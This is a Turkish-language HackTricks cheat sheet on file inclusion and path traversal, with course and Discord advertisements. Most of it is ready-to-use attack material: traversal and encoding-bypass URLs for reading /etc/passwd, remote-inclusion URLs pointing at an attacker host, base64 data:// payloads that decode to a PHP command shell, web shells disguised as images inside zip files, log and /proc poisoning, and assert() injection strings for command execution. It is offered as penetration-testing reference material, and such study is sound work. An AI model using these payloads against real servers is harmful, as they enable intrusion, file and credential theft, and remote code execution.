# Dosya Dahil Etme/Yol Geçişi

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi(https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i(https://opensea.io/collection/the-peass-family) içeren koleksiyonumuz
* **Bize katılın** 💬 [**Discord grubunda**](https://discord.gg/hRep4RUj7f) veya [**telegram grubunda**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud** github depolarına PR göndererek katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hackleme İçgörüleri**\
Hackleme heyecanını ve zorluklarını ele alan içeriklerle etkileşime girin

**Gerçek Zamanlı Hack Haberleri**\
Hızla değişen hackleme dünyasında gerçek zamanlı haberler ve içgörülerle güncel kalın

**En Son Duyurular**\
Yeni ödül avı başlatmaları ve önemli platform güncellemeleri hakkında bilgilenin

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!

## Dosya Dahil Etme

**Uzak Dosya Dahil Etme (RFI):** Dosya uzak sunucudan yüklenir (En İyi: Kodu yazabilir ve sunucu onu yürütür). Php'de bu varsayılan olarak **devre dışı bırakılmıştır** (**allow\_url\_include**).\
**Yerel Dosya Dahil Etme (LFI):** Sunucu yerel bir dosyayı yükler.

Bu zafiyet, kullanıcının sunucu tarafından yüklenecek dosyayı bir şekilde kontrol edebildiği durumlarda ortaya çıkar.

Zarar görebilecek **PHP fonksiyonları**: require, require\_once, include, include\_once

Bu zafiyeti sömürmek için ilginç bir araç: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Kör - İlginç - LFI2RCE dosyaları
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Çeşitli \*nix LFI listelerini karıştırarak ve daha fazla yol ekleyerek şunu oluşturdum:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Ayrıca `/` yerine `\` kullanmayı deneyin\
Ayrıca `../../../../../` eklemeyi deneyin

Vulnerabilite varlığını kontrol etmek için /etc/password dosyasını bulmak için çeşitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) bulunabilir.

### **Windows**

Farklı kelime listelerinin birleşimi:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Ayrıca `/` yerine `\` kullanmayı deneyin\
Ayrıca `C:/`'yi kaldırıp `../../../../../` eklemeyi deneyin

Vulnerabilite varlığını kontrol etmek için /boot.ini dosyasını bulmak için çeşitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) bulunabilir.

### **OS X**

Linux'un LFI listesini kontrol edin.

## Temel LFI ve bypasslar

Tüm örnekler Yerel Dosya Dahil etme için olsa da, Uzak Dosya Dahil etme için de uygulanabilir (sayfa=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sıralama dizileri yinelemesiz olarak çıkarıldı
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Verilen dizenin sonuna daha fazla karakter ekleyerek atlayın (atlatma: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu **PHP 5.4'ten beri çözüldü**

### **Kodlama**

Çift URL kodlaması gibi standart olmayan kodlamaları kullanabilirsiniz:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Var olan klasörden

Belki de arka uç, klasör yolunu kontrol ediyor:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Sunucudaki Dosya Sistemi Dizinlerini Keşfetme

Bir sunucunun dosya sistemi, belirli teknikleri kullanarak sadece dosyaları değil, dizinleri de keşfetmek için rekürsif olarak taranabilir. Bu süreç, dizin derinliğini belirlemeyi ve belirli klasörlerin varlığını sorgulamayı içerir. Aşağıda bunu başarmak için detaylı bir yöntem bulunmaktadır:

1. **Dizin Derinliğini Belirleme:** Mevcut dizinin derinliğini belirlemek için `/etc/passwd` dosyasını başarılı bir şekilde alarak (sunucu Linux tabanlıysa geçerlidir) dizin derinliğini belirleyin. Derinliği üç olan bir örnek URL aşağıdaki gibi yapılandırılmış olabilir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Klasörler için Araştırma:** Şüphelenilen klasörün adını (örneğin, `private`) URL'ye ekleyin, ardından `/etc/passwd` dizinine geri gidin. Ek dizin seviyesi, derinliği bir artırmayı gerektirir:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Sonuçları Yorumlayın:** Sunucunun yanıtı, klasörün varlığını belirtir:
   * **Hata / Çıktı Yok:** `private` klasörünün belirtilen konumda muhtemelen mevcut olmadığını gösterir.
   * **`/etc/passwd` Dosyasının İçeriği:** `private` klasörünün varlığı doğrulanmıştır.
4. **Recursive Keşif:** Keşfedilen klasörler, aynı teknik veya geleneksel Yerel Dosya Dahil Etme (LFI) yöntemleri kullanılarak alt dizinler veya dosyalar için daha fazla sorgulanabilir.

Farklı konumlardaki dizinleri keşfetmek için yükü uygun şekilde ayarlayın. Örneğin, `/var/www/` dizininde `private` adlı bir klasörün olup olmadığını kontrol etmek için (mevcut dizinin 3 derinliğinde olduğunu varsayarak) kullanın:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Yol Kısaltma Tekniği**

Yol kısaltma, web uygulamalarındaki dosya yollarını manipüle etmek için kullanılan bir yöntemdir. Genellikle, belirli güvenlik önlemlerini atlayarak kısıtlanmış dosyalara erişmek için kullanılır. Hedef, güvenlik önlemi tarafından değiştirildiğinde hala istenilen dosyaya işaret eden bir dosya yolunu oluşturmaktır.

PHP'de, bir dosya yolunun çeşitli temsilleri, dosya sisteminin doğası gereği eşdeğer kabul edilebilir. Örneğin:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` ve `/etc/passwd/` tümü aynı yol olarak kabul edilir.
* Son 6 karakter `passwd` ise, bir `/` eklemek (`passwd/` yapmak) hedeflenen dosyayı değiştirmez.
* Benzer şekilde, bir dosya yoluna `.php` eklenirse (örneğin `shellcode.php`), sonuna `/.` eklemek erişilen dosyayı değiştirmez.

Sağlanan örnekler, `/etc/passwd`'ye erişmek için yol kısaltmayı nasıl kullanacağınızı göstermektedir, bu hassas içeriğe (kullanıcı hesap bilgileri) sahip yaygın bir hedeftir:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda, gereken geçiş sayısı yaklaşık olarak 2027 olabilir, ancak bu sayı sunucunun yapılandırmasına bağlı olarak değişebilir.

* **Nokta Segmentleri ve Ek Karakterler Kullanma**: Geçiş dizileri (`../`), ek nokta segmentleri ve karakterlerle birleştirilerek dosya sisteminde gezinmek için kullanılabilir, bu sayede sunucu tarafından eklenen dizeleri yoksayarak istenen yolu (`/etc/passwd`) koruyabilirsiniz.
* **Gerekli Geçiş Sayısının Belirlenmesi**: Deneme yanılma yoluyla, kök dizinine ve ardından `/etc/passwd` dizinine gezinmek için gereken `../` dizilerinin kesin sayısını bulabilirsiniz. Bu sayede eklenen dizeler (örneğin `.php`) nötralize edilir ancak istenen yol (`/etc/passwd`) korunur.
* **Sahte Bir Dizinle Başlama**: Yolun var olmayan bir dizinle başlatılması (örneğin `a/`) yaygın bir uygulamadır. Bu teknik, bir önlem olarak veya sunucunun yol ayrıştırma mantığını karşılamak için kullanılır.

Yol kısaltma tekniklerini kullanırken, sunucunun yol ayrıştırma davranışını ve dosya sistemi yapısını anlamak son derece önemlidir. Her senaryo farklı bir yaklaşım gerektirebilir ve en etkili yöntemi bulmak için genellikle test yapmak gerekir.

**Bu zayıflık PHP 5.3'te düzeltildi.**

### **Filtre atlatma hileleri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Uzak Dosya Dahil Etme

Php'de bu varsayılan olarak devre dışı bırakılmıştır çünkü **`allow_url_include`** **Kapalıdır.** Çalışması için **Açık** olmalıdır ve bu durumda sunucunuzdan bir PHP dosyasını dahil edebilir ve RCE alabilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Eğer bir nedenden dolayı **`allow_url_include`** etkinse, ancak PHP dış web sayfalarına erişimi **filtreliyorsa**, [bu yazıya](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) göre, örneğin base64 ile bir b64 PHP kodunu çözmek ve RCE elde etmek için data protokolünü kullanabilirsiniz:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Önceki kodda, saldırganın `.txt` ile biten bir dizeye ihtiyaç duyduğu için, dize onunla biter ve b64 decode işleminden sonra o kısım sadece gereksiz veri döndürür ve gerçek PHP kodu dahil edilir (ve dolayısıyla, yürütülür).
{% endhint %}

`php://` protokolünü **kullanmayan başka bir örnek** ise:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Kök öğesi

Python'da şu gibi bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Eğer kullanıcı **`file_name`**'e **mutlak bir yol** geçirirse, **önceki yol sadece kaldırılır**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
İlgili belgelere göre [dokümantasyon](https://docs.python.org/3.10/library/os.path.html#os.path.join) şöyle diyor:

> Bir bileşen mutlak bir yol ise, tüm önceki bileşenler atılır ve birleştirme mutlak yol bileşeninden devam eder.

## Java Dizinleri Listele

Java'da bir Yol Traversal'ı olduğunda ve bir dosya yerine bir **dizin istendiğinde, dizinin bir listesi döndürülür**. Bu diğer dillerde (bildiğim kadarıyla) gerçekleşmeyecek.

## En İyi 25 Parametre

İşte yerel dosya dahil etme (LFI) açıklıklarına karşı savunmasız olabilecek en iyi 25 parametre listesi ([linkten](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHP sargılayıcıları ve protokollerini kullanarak LFI / RFI

### php://filter

PHP filtreleri, veriler üzerinde **temel değiştirme işlemlerini** gerçekleştirmeyi sağlar. 5 kategoriye ayrılırlar:

* [Dize Filtreleri](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Veriden etiketleri kaldırır ("<" ve ">" karakterleri arasındaki her şey)
* Bu filtre modern PHP sürümlerinden kaybolmuştur
* [Dönüşüm Filtreleri](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Farklı bir kodlamaya dönüştürür (`convert.iconv.<giriş_kod>.<çıkış_kod>`) . Desteklenen **tüm kodlamaların listesini** almak için konsolda çalıştırın: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` dönüşüm filtresini kötüye kullanarak **keyfi metin oluşturabilirsiniz**, bu da keyfi metin yazmak veya keyfi metin işlemek için yararlı olabilir. Daha fazla bilgi için [**php filtreleri aracılığıyla LFI2RCE**](lfi2rce-via-php-filters.md)'ye bakın.
{% endhint %}

* [Sıkıştırma Filtreleri](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: İçeriği sıkıştırır (çok fazla bilgiyi dışarı çıkarmak için kullanışlıdır)
* `zlib.inflate`: Veriyi açar
* [Şifreleme Filtreleri](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Kullanımdan kaldırıldı
* `mdecrypt.*` : Kullanımdan kaldırıldı
* Diğer Filtreler
* `var_dump(stream_get_filters());` komutunu çalıştırarak php'de birkaç **beklenmeyen filtre** bulabilirsiniz:
* `consumed`
* `dechunk`: HTTP parçalı kodlamayı tersine çevirir
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" kısmı harf büyüklüğüne duyarsızdır
{% endhint %}

### php filtrelerini kullanarak keyfi dosyaları okumak için oracle olarak kullanma

[**Bu yazıda**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) sunucudan geri dönen çıktı olmadan yerel bir dosyayı okumak için bir teknik önerilmektedir. Bu teknik, php filtrelerini oracle olarak kullanarak dosyanın **boolean sızdırılmasına (her karakter için) dayanmaktadır**. Bu, php filtrelerinin bir metni yeterince büyük yapmak için kullanılabileceği ve php'nin bir istisna fırlatmasına neden olabileceği anlamına gelir.

Orijinal yazıda teknik hakkında detaylı bir açıklama bulabilirsiniz, ancak işte hızlı bir özet:

* Metnin başındaki karakteri bırakmak ve dize boyutunu üssel olarak artırmak için **`UCS-4LE`** kod çözücüsünü kullanın.
* Bu, **başlangıç harfi doğru tahmin edildiğinde php'nin bir hata fırlatacağı kadar büyük bir metin oluşturmak için kullanılacaktır**
* **Dechunk** filtresi, **ilk karakterin onaltılık olmadığını anlarsak her şeyi kaldırır**, bu nedenle ilk karakterin onaltılık olup olmadığını bilebiliriz.
* Bu, öncekiyle birleştirildiğinde (ve tahmin edilen harfe bağlı diğer filtrelerle), metnin başındaki bir harfi tahmin etmemize izin verecektir; çünkü eğer onaltılıksa, dechunk onu silmeyecek ve başlangıç bombası php hatası yapacaktır.
* **convert.iconv.UNICODE.CP930** kod çözücüsü her harfi bir sonraki harfe dönüştürür (bu nedenle bu kod çözücüsünden sonra: a -> b). Bu, örneğin ilk harfin `a` olup olmadığını keşfetmemizi sağlar çünkü 6 kez bu kod çözücüsünü uygularsak a->b->c->d->e->f->g harf artık onaltılık bir karakter olmaz, bu nedenle dechunk onu silmez ve php hatası tetiklenir çünkü başlangıç bombası ile çarpılır.
* Başlangıçta **rot13** gibi diğer dönüşümler kullanılarak n, o, p, q, r gibi diğer karakterlerin sızdırılması mümkündür (ve diğer kod çözücüleri kullanılarak diğer harflerin onaltılık aralığa taşınması mümkündür).
* Başlangıç karakteri bir sayı ise, onu base64 kodlamak ve sayıyı sızdırmak için ilk 2 harfi sızdırmak gereklidir.
* **Başlangıç harfinden daha fazla karakter sızdırmak için** sıra bellek filtreleri kullanarak (**convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**) karakterlerin sırasını değiştirmek ve metnin ilk pozisyonunda diğer harfleri almak mümkündür.
* Ve **daha fazla veri elde etmek** için fikir, **başlangıçta 2 byte'lık gereksiz veri oluşturmak** için **convert.iconv.UTF16.UTF16** kullanmak, bunu **UCS-4LE** uygulamak ve **junk veriye kadar veriyi silmek** (bu, başlangıç metninin ilk 2 byte'ını kaldıracaktır). İstenen biti sızdırana kadar bunu yapmaya devam edin.

Yazıda bunu otomatik olarak gerçekleştirmek için bir araç de sızdırıldı: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Bu sarmalayıcı, işlemin açık olan dosya tanımlayıcılarına erişim sağlar. Açık dosyaların içeriğini sızdırmak için potansiyel olarak kullanışlı olabilir:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ayrıca **php://stdin, php://stdout ve php://stderr** kullanarak sırasıyla **dosya tanımlayıcıları 0, 1 ve 2'ye** erişebilirsiniz (bu nasıl bir saldırıda kullanılabilir emin değilim)

### zip:// ve rar://

İçinde bir PHPShell bulunan bir Zip veya Rar dosyası yükleyin ve erişin.\
Rar protokolünü istismar edebilmek için **özellikle etkinleştirilmesi gerekir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

data:// URI scheme allows data to be embedded directly into the URI. This can be used in file inclusion vulnerabilities to include data from the URI directly into the application.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### expect://

Beklenti etkinleştirilmelidir. Bunu kullanarak kodu yürütebilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametrelerindeki yükünüzü belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyası, bir web uygulaması dosya yükleme için `include` gibi işlevleri kullandığında PHP kodunu yürütmek için kullanılabilir. Aşağıdaki PHP kod parçacığı, bir `.phar` dosyasının nasıl oluşturulacağını göstermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasını derlemek için aşağıdaki komut çalıştırılmalıdır:
```bash
php --define phar.readonly=0 create_path.php
```
Uygulandığında, `test.phar` adında bir dosya oluşturulur, bu da Potansiyel olarak Yerel Dosya Dahil Etme (LFI) zafiyetlerini sömürmek için kullanılabilir.

LFI'nin yalnızca PHP kodunu çalıştırmadan dosya okuma işlemi gerçekleştirdiği durumlarda, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` veya `filesize()` gibi işlevler aracılığıyla, bir deserializasyon zafiyetinin sömürülmesi denenebilir. Bu zafiyet, dosyaların `phar` protokolü kullanılarak okunmasıyla ilişkilidir.

`.phar` dosyaları bağlamında deserializasyon zafiyetlerini sömürme konusunda detaylı bilgi için aşağıdaki belgeye başvurun:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

**PHP filtrelerini destekleyen PHP'den herhangi bir dosyanın keyfi okunmasını kötüye kullanmak** ve Uzaktan Kod Çalıştırma (RCE) elde etmek mümkündü. Detaylı açıklama [**bu yazıda bulunabilir**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Çok hızlı bir özet: PHP yığınında **3 bayt taşma** kötüye kullanılarak, belirli bir boyuttaki **serbest parça zincirini değiştirmek** için herhangi bir adrese **herhangi bir şey yazabilmek** için bir kancaya **`system`** çağrısı eklendi.\
Daha fazla PHP filtresi kötüye kullanarak belirli boyutlarda parçalar tahsis etmek mümkündü.

### Daha fazla protokol

Daha fazla olası [**buraya dahil edilebilecek protokoller**](https://www.php.net/manual/en/wrappers.php)**'i kontrol edin:**

* [php://memory ve php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Belleğe veya geçici bir dosyaya yazma (bu nasıl bir dosya dahil etme saldırısında kullanışlı olabilir emin değilim)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Yerel dosya sistemine erişim
* [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL'lerine erişim
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL'lerine erişim
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Sıkıştırma Akışları
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Deseni eşleşen dosya yollarını bulma (Yazdırılabilir bir şey döndürmez, bu yüzden burada gerçekten kullanışlı değil)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Güvenli Kabuk 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ses akışları (Keyfi dosyaları okumak için kullanışlı değil)

## PHP'nin 'assert' İle LFI

PHP'de Yerel Dosya Dahil Etme (LFI) riskleri, dizin gezintisi karakterleri içeren girdilerin kontrol edildiği ancak uygun şekilde temizlenmediği durumlarda 'assert' işleviyle uğraşırken özellikle yüksektir.

Örneğin, PHP kodu, dizin gezintisinin önlenmesi için aşağıdaki gibi tasarlanmış olabilir:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, traversal'ı durdurmayı amaçlasa da, yanlışlıkla kod enjeksiyonu için bir vektör oluşturur. Dosya içeriğini okumak için bunu sömürmek için bir saldırgan şunları kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer şekilde, keyfi sistem komutlarını yürütmek için şunu kullanabilirsiniz:
```plaintext
' and die(system("id")) or '
```
**Payloadları URL kodlamayı unutmayın**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın ve deneyimli hackerlar ve ödül avcıları ile iletişim kurun!

**Hacking İçgörüleri**\
Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime girin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avcılıklarını ve önemli platform güncellemelerini takip edin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliğine başlayın!**

## PHP Kör Yol Geçişi

{% hint style="warning" %}
Bu teknik, bir dosyaya erişecek bir PHP işlevinin **dosya yolunu kontrol ettiğiniz** ancak dosyanın içeriğini görmeyeceğiniz durumlarda önemlidir (örneğin, **`file()`** gibi basit bir çağrı) ancak içerik gösterilmez.
{% endhint %}

[**Bu inanılmaz yazıda**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) PHP filtresi aracılığıyla bir kör yol geçişinin nasıl kötüye kullanılabileceği açıklanmaktadır, dosyanın içeriğini bir hata orak aracılığıyla dışa aktarmak için.

Özetle, teknik dosyanın içeriğini **büyük** yapmak için **"UCS-4LE" kodlamasını** kullanır, böylece dosyayı açan PHP işlevi bir **hata** tetikler.

Ardından, ilk karakteri sızdırmak için filtre **`dechunk`** kullanılır ve son olarak **base64** veya **rot13** gibi diğer filtrelerle birlikte **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** filtreleri kullanılarak diğer karakterlerin başına yerleştirilir ve sızdırılır.

**Zarar görebilecek işlevler**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (yalnızca bu ile salt okunur hedef)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik detaylar için belirtilen yazıya bakın!

## LFI2RCE

### Uzaktan Dosya Dahil Etme

Daha önce açıklandığı gibi, [**bu bağlantıyı takip edin**](./#remote-file-inclusion).

### Apache/Nginx günlük dosyası aracılığıyla

Eğer Apache veya Nginx sunucusu **LFI'ye açıksa** dahil etme işlevi içinde **`/var/log/apache2/access.log` veya `/var/log/nginx/access.log`**'a erişmeyi deneyebilirsiniz, **kullanıcı ajanı** içine veya bir **GET parametresi** içine **`<?php system($_GET['c']); ?>`** gibi bir php shell yerleştirin ve o dosyayı dahil edin

{% hint style="warning" %}
**Kabuk için çift tırnak** kullanırsanız, çift tırnaklar "_**quote;**_" dizesi için değiştirilecek, **PHP orada bir hata fırlatacak** ve **başka bir şey yürütülmeyecek**.

Ayrıca, **payload'ı doğru şekilde yazdığınızdan** emin olun; aksi takdirde PHP, günlük dosyasını yüklemeye her çalıştığında hata verecek ve ikinci bir fırsatınız olmayacak.
{% endhint %}

Bu aynı zamanda diğer günlük dosyalarında da yapılabilir ancak **dikkatli olun**, günlük dosyalarındaki kod URL kodlanmış olabilir ve bu Shell'i yok edebilir. **Yetkilendirme "basic"** başlığı Base64'te "kullanıcı:şifre" içerir ve günlük dosyalarında çözülür. PHPShell bu başlığın içine yerleştirilebilir.\
Diğer olası günlük yolları:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing kelime listesi: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta Aracılığıyla

**Bir e-posta** içeren PHP yükünüzü (`<?php echo system($_REQUEST["cmd"]); ?>`) içeren bir iç hesap (user@localhost) adresine gönderin ve kullanıcının e-postasına şu şekilde bir yol ile dahil etmeyi deneyin: **`/var/mail/<KULLANICI ADI>`** veya **`/var/spool/mail/<KULLANICI ADI>`**

### /proc/\*/fd/\* Aracılığıyla

1. Birçok shell yükleyin (örneğin: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) adresini dahil edin, burada $PID = işlemin PID'si (kaba kuvvet saldırısı ile bulunabilir) ve $FD dosya tanımlayıcısıdır (bu da kaba kuvvet saldırısı ile bulunabilir)

### /proc/self/environ Aracılığıyla

Bir günlük dosyası gibi, yükü User-Agent içinde gönderin, bu /proc/self/environ dosyasında yansıtılacaktır
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Yükleme yoluyla

Bir dosya yükleyebiliyorsanız, sadece kabuk yüklemesini enjekte edin (ör. : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
### Zip dosyası yükleme aracılığıyla

